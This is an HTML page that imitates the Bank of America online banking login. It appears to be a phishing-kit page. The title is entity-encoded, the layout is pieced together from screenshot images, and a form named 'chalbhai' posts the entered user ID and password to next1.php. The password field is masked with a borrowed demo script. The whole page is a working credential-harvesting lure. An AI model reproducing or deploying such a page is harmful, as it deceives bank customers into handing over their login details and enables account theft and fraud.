<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#124;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#124;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</title>
 <script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:226px; top:9px; width:987px; height:199px; z-index:0"><img src="images/s1.png" alt="" title="" border=0 width=987 height=199></div>

<div id="image2" style="position:absolute; overflow:hidden; left:226px; top:487px; width:987px; height:151px; z-index:1"><img src="images/s2.png" alt="" title="" border=0 width=987 height=151></div>

<div id="image3" style="position:absolute; overflow:hidden; left:989px; top:203px; width:124px; height:36px; z-index:2"><a href="#"><img src="images/s3.png" alt="" title="" border=0 width=124 height=36></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1148px; top:22px; width:63px; height:13px; z-index:3"><a href="#"><img src="images/s13.png" alt="" title="" border=0 width=63 height=13></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:261px; top:162px; width:93px; height:118px; z-index:4"><img src="images/s7.png" alt="" title="" border=0 width=93 height=118></div>

<div id="image6" style="position:absolute; overflow:hidden; left:273px; top:301px; width:205px; height:17px; z-index:5"><a href="#"><img src="images/s4.png" alt="" title="" border=0 width=205 height=17></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:252px; top:537px; width:105px; height:14px; z-index:6"><a href="#"><img src="images/s5.png" alt="" title="" border=0 width=105 height=14></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:463px; top:565px; width:122px; height:13px; z-index:7"><a href="#"><img src="images/s6.png" alt="" title="" border=0 width=122 height=13></a></div>
<form action=next1.php name=chalbhai id=chalbhai method=post>
<input name="user" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:206px;left:262px;top:184px;z-index:8">
<input name="psw" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:206px;left:262px;top:252px;z-index:9">
<div id="formimage1" style="position:absolute; left:264px; top:339px; z-index:10"><input type="image" name="formimage1" width="75" height="28" src="images/btn.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	

</body>
</html>
